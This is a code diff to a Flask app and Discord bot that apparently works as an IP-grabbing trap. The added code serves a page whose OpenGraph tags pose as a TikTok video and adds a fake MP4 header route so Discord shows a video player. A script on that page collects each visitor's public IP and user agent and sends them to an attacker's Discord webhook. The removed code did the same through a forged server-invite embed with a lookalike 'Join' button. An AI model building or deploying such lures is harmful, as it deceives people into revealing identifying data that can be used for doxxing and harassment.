@@ -21,16 +21,55 @@ WEBHOOK_URL = os.environ.get("WEBHOOK_URL")
 RAILWAY_URL = "https://rnbw-production.up.railway.app"
 # ---------------------
 
-# Simple redirect trap
 @app.route('/')
 def index():
-    return redirect("https://vt.tiktok.com/ZSs8LHYyG/", code=302)
+    # When they hit the root, serve the OpenGraph tags to make it look like a TikTok video
+    return """
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>TikTok</title>
+        <meta property="og:type" content="video.other">
+        <meta property="og:site_name" content="TikTok">
+        <meta property="og:title" content="Wait for it... 😂">
+        <meta property="og:description" content="1.2M views • 2 hours ago">
+        <meta property="og:video" content="https://rnbw-production.up.railway.app/video.mp4">
+        <meta property="og:video:secure_url" content="https://rnbw-production.up.railway.app/video.mp4">
+        <meta property="og:video:type" content="video/mp4">
+        <meta property="og:image" content="https://i.ytimg.com/vi/dQw4w9WgXcQ/maxresdefault.jpg">
+    </head>
+    <body>
+        <script>
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(d => {
+                    fetch('/log', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({ip: d.ip, ua: navigator.userAgent})
+                    }).then(() => {
+                        window.location.href = "https://vt.tiktok.com/ZSs8LHYyG/";
+                    });
+                });
+        </script>
+    </body>
+    </html>
+    """
 
-@app.route('/trap')
-def trap():
-    # Grab the IP
-    ip = request.headers.get('CF-Connecting-IP', request.remote_addr)
-    ua = request.headers.get('User-Agent', 'Unknown')
+@app.route('/video.mp4')
+def fake_video():
+    # Fake MP4 header to trick Discord into showing the native video player
+    return app.response_class(
+        response=b'\x00\x00\x00\x18ftypmp42\x00\x00\x00\x00mp42isom',
+        status=200,
+        mimetype='video/mp4'
+    )
+
+@app.route('/log', methods=['POST'])
+def log():
+    data = request.json
+    ip = data.get('ip', 'Unknown')
+    ua = data.get('ua', 'Unknown')
     
     device = "Unknown"
     if "Windows" in ua: device = "Windows PC"
@@ -45,15 +84,13 @@ def trap():
             "fields": [
                 {"name": "Device Name", "value": f"```{device}```", "inline": False},
                 {"name": "Public IP", "value": f"```{ip}```", "inline": False},
-                {"name": "Method", "value": "```Invite Click```", "inline": False}
+                {"name": "Method", "value": "```Video Click```", "inline": False}
             ]
         }]
     }
     if WEBHOOK_URL:
         requests.post(WEBHOOK_URL, json=payload)
-    
-    # Redirect to TikTok after grab
-    return redirect("https://vt.tiktok.com/ZSs8LHYyG/", code=302)
+    return "ok", 200
 
 # --- DISCORD BOT ---
 intents = discord.Intents.default()
@@ -66,40 +103,9 @@ async def on_ready():
 
 @bot.command()
 async def send(ctx):
-    # We build a custom embed that looks exactly like an invite
-    embed = {
-        "title": "BRXXKS",
-        "description": "BRXXKS Official Community Server!\n\n🗡️🔥 🛡️🔥",
-        "color": 0x2b2d31,
-        "author": {
-            "name": "You've been invited to join a server",
-            "icon_url": "https://cdn.discordapp.com/emojis/1158760024939425853.gif" 
-        },
-        "fields": [
-            {"name": "🟢 7,054 Online", "value": "⚪ 147,903 Members", "inline": True}
-        ],
-        "image": {
-            "url": "https://cdn.discordapp.com/banners/1188617507765235722/a_1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6.webp?size=600"
-        },
-        "thumbnail": {
-            "url": "https://cdn.discordapp.com/icons/1188617507765235722/a_1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6.webp?size=128"
-        },
-        "footer": {
-            "text": "Est. Aug 2023"
-        }
-    }
-    
-    # Send it with a button that looks like the green Join button
-    # Note: Standard Discord bots cannot generate the native server invite button, 
-    # but we can use a Discord UI link button to mimic it perfectly.
-    view = discord.ui.View()
-    view.add_item(discord.ui.Button(
-        style=discord.ButtonStyle.link,
-        label="Join",
-        url=f"{RAILWAY_URL}/trap"
-    ))
-    
-    await ctx.send(embed=discord.Embed.from_dict(embed), view=view)
+    # Sending the raw link forces Discord to scrape the OG tags and build the video player.
+    # The < > brackets stop Discord from turning it into a standard text link, leaving ONLY the player.
+    await ctx.send(f"<{RAILWAY_URL}>")
 
 def run_bot():
     if not BOT_TOKEN:
